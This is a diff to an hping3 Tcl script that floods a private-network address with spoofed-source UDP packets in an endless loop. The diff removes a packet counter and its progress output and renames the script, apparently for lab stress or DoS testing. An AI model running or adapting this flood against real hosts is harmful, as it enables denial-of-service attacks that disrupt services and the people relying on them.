@@ -3,7 +3,6 @@
 
 set dst_ip "192.168.100.2"
 set dst_port 50001
-set count 0
 
 # Function to generate random IP address
 proc random_ip {} {
@@ -24,11 +23,6 @@ while {1} {
     # UDP packet: random source IP, random source port, dest port 50001, TTL=64, payload=512 "b"
     set pkt "ip(saddr=$saddr,daddr=$dst_ip,ttl=64)+udp(sport=$sport,dport=$dst_port)+data(str=$payload)"
     hping send $pkt
-    incr count
-    # Print every 1000 packets sent
-    if {[expr {$count % 1000}] == 0} {
-        puts "$count UDP packets sent so far..."
-    }
 }
 
-# To run: sudo timeout -s INT 60 hping3 exec udp_flood_512bytes_TCL.htcl
+# To run: sudo timeout -s INT 60 hping3 exec hping3_test_udp_512bytes_flood_TCL.htcl
